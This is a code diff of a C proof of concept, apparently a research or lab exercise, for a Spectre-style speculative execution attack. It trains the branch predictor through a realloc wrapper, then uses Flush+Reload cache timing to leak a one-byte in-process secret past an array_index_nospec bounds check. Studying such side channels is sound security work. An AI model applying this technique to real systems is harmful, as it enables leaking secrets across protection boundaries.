@@ -14,7 +14,6 @@
 #include <sys/resource.h> 
 
 
-const char *secret = "!";
 #define PAGE_SIZE 4096
 #define NUM_PAGES 256
 #define TRAINING_EPOCH 16
@@ -34,41 +33,44 @@ void set_heap_limit(size_t limit_bytes) {
     }
 }
 
+uint8_t* secret_init(){
+    uint8_t* array = malloc(1);
+    if (array == NULL) {
+        perror("Initial malloc failed");
+        return NULL;
+    }
+    array[0] = '!';
+    return array;
+}
+
 uint8_t* array_init(){   
-    printf("here");
     uint8_t* array = malloc(array_size * sizeof(uint8_t));
     if (array == NULL) {
         perror("Initial malloc failed");
         return NULL;
     }
-
-    for(int i = 0; i < 8; i++){
-        array[i] = i;
-    }
     return array;
 } 
 
-uint8_t victim_function(uint8_t ** array, uint8_t * page, uint32_t index, uint32_t stride){
-    printf("Here");
-    if(array_size < index){
-        uint8_t * new_array = realloc(* array, index * sizeof(uint8_t));
-        array_size = index;
-        if (new_array == NULL) {
-            printf("realloc failed! arr_size would be %zu but allocation failed\n", 
-                array_size);
-            
-        } else {
-            *array = new_array;
-            printf("realloc succeed! arr_size is %zux\n", 
-                array_size);
-            memset(*array, 0, array_size * sizeof(uint8_t));
-        }
+static void *realloc_wrapper(void* ptr, size_t old_size, size_t new_size){
+    _mm_clflush(&old_size);
+    _mm_clflush(&new_size);
+    if (new_size <= old_size && new_size >= old_size / 2){
+        return ptr;
+    } else {
+        return realloc(ptr, new_size);
     }
+}
 
-    uint8_t new_idx = array_index_nospec(index, array_size);
+uint8_t* victim_function(uint8_t** array, uint8_t * page, uint32_t index, uint32_t stride, uint32_t size) {
+    uint32_t temp_array_size = size;
+    *array = realloc_wrapper(*array, array_size, size);
+
+    uint8_t new_idx = array_index_nospec(index, temp_array_size);
     uint8_t secret = (*array)[new_idx];
+    uint8_t transmission = page[secret * stride];
 
-    return page[secret * stride];
+    return NULL;
 }
 
 
@@ -152,8 +154,9 @@ void attacker_function() {
     // Create read-only shared pages for Flush+Reload
     // SYMBOL_CNT=256
     uint8_t *array = array_init();
-    uint8_t *pages = mmap(NULL, PAGE_SIZE * SYMBOL_CNT, PROT_READ,
-                          MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+    char *secret = secret_init();
+    uint8_t *pages = mmap(NULL, PAGE_SIZE * SYMBOL_CNT, PROT_READ | PROT_WRITE,
+                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
     if (pages == MAP_FAILED) {
         perror("mmap");
         return errno;
@@ -177,13 +180,15 @@ void attacker_function() {
     for (size_t c = 0; c < strlen(secret) && c < BUF_SIZE; c++) {
 
         for (size_t r = 0; r < REP; r++) {
-            size_t safe_index = array_size;
+            size_t safe_size = array_size-1; //New size but not too small to actually want to resize
+            size_t safe_index = array_size/2; //An in-bound index
+            size_t malicious_size = (size_t)(malicious_index+1);
             for (size_t t = 0; t < TRAINING_EPOCH; t++) {
                 // We use an in-bound index for the first TRAINING_EPOCH - 1
                 // iterations and switch to the malicious index
                 // for the last iteration
-                safe_index = safe_index * 2;
                 bool is_attack = (t % TRAINING_EPOCH == TRAINING_EPOCH - 1);
+                size_t size = csel(malicious_size, safe_size, is_attack);
                 size_t index = csel(malicious_index, safe_index, is_attack);
 
                 // The "Flush" part of Flush+Reload
@@ -201,13 +206,8 @@ void attacker_function() {
                 _mm_lfence();
 
 
-                printf("Calling victim_function with index: %zu\n", index);
-                victim_function(&array, pages, index, PAGE_SIZE);
-
-
                 // Call the victim function and prevent compiler optimizations
-                // TODO: change to correct victim function parameters
-                // _no_opt(victim_function(records, index));
+                _no_opt(victim_function(&array, pages, index, PAGE_SIZE, size));
             }
 
             for (size_t i = 0; i < SYMBOL_CNT; i++) {
